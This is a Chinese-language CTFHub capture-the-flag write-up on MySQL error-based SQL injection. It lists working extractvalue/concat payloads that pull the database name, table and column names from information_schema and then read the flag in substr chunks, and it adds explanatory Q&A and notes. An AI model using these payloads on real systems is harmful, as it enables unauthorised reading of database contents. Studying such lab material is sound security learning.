---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 报错注入"
date: 2026-10-26

skill: "web-sql/报错注入"
completed: true
---

# CTFHub Writeup - 报错注入

## 题目类型

Web

## 题目描述

┌────────────────────────────────────────────┐
│                                                                                                                  │
│                                                                                                                  │
│              SQL 报错注入                                                                              │  
│                                                                                                                  │
│   ┌────┬──────────────────────┬─────────┐  │
│   │ ID │  输个1试试？          │ Search  │  │
│   └────┴──────────────────────┴─────────┘  │
│     ↑         ↑                    ↑       │
│   灰底框    输入框(placeholder)   绿按钮    │
│                                            │
└────────────────────────────────────────────┘

## 解题过程

<br>1. 在目标页面使用 curl 向 id 参数提交单引号：curl -s -G "$BASE" --data-urlencode "id=1'"。页面返回 MySQL 报错原文，内容包含 “You have an error in your SQL syntax: ... near ''' at line 1”，记录判断为该处可以注入。
<br>2. 构造 extractvalue 报错注入 Payload：id=1 and extractvalue(1,concat(0x7e,database()))。页面返回 “XPATH syntax error: '~sqli'”，由此从报错信息中带出当前数据库名 sqli。
<br>3. 将 database() 替换为查询 information\_schema 的子查询。查询表名时，Payload 为 id=1 and extractvalue(1,concat(0x7e,(select group\_concat(table\_name) from information\_schema.tables where table\_schema=database())))，返回内容出现 '~flag,news'，记录显示存在 flag 表。随后查询该表字段，Payload 为 id=1 and extractvalue(1,concat(0x7e,(select group\_concat(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='flag')))，返回内容出现 '~flag'，记录显示字段名为 flag。
<br>4. 读取 flag 时使用 substr 分段。先提交 id=1 and extractvalue(1,concat(0x7e,substr((select flag from flag limit 0,1),1,24)))，返回 '~ctfhub\{2de1b72d6757f4ece'；再提交 id=1 and extractvalue(1,concat(0x7e,substr((select flag from flag limit 0,1),25,24)))，返回 '~880b787\}'。将两段内容拼接，得到 ctfhub\{2de1b72d6757f4ece880b787\}。

## 疑问与解答

### 1.

<br>问题：为什么提交单引号后页面报 SQL 语法错误，就能判断可能存在注入？
<br>解答：单引号会破坏原 SQL 语句的字符串边界，如果页面直接显示数据库返回的语法错误，说明输入被拼入 SQL 查询且错误信息未屏蔽，这为后续利用报错回显数据提供了条件。

### 2.

<br>问题：extractvalue 为什么能把 database() 的结果带出来？
<br>解答：extractvalue 的第二个参数需要是合法 XPath 表达式；用 concat(0x7e,database()) 拼出非法 XPath 后，MySQL 会在 XPATH syntax error 中包含该非法片段，于是 database() 的值随报错信息一起回显。

### 3.

<br>问题：读取 flag 时为什么要用 substr 分成两段？
<br>解答：报错注入的回显内容长度通常有限，extractvalue 的 XPATH 错误回显可能只显示前一段字符；用 substr(...,1,24) 和 substr(...,25,24) 分段截取，再把两次返回的片段拼接，可以完整取出较长结果。


## 本题的核心逻辑：



<br>本题核心是 MySQL 报错注入：用户输入进入 SQL 查询后未被安全处理，页面又回显数据库错误信息。利用 extractvalue 产生 XPath 语法错误，把子查询结果拼接到错误消息中，先确认当前库名，再通过 information\_schema.tables 和 information\_schema.columns 获取表名、字段名，最后读取目标字段数据；由于回显长度有限，还需要用 substr 分段拼接。


## 笔记

这道题主要学习了：

<br>1. 报错注入的关键在于让数据库把查询结果嵌入错误信息。extractvalue 和 updatexml 是 MySQL 中常见的报错注入函数，前者通过构造非法 XPath 触发 XPATH syntax error，从错误回显中读取数据。
<br>2. 查询表名和字段名时，information\_schema.tables 与 information\_schema.columns 是 MySQL 的元数据表，可配合 table\_schema=database() 限定当前数据库，再用 group\_concat 把多条结果合并到一次报错回显中。
<br>3. 报错回显长度有限时，可使用 substr 按位置截取目标字段，并通过 limit 控制读取行；把多次截取结果拼接后即可得到完整数据，这也是处理较长 flag 的常用方式。
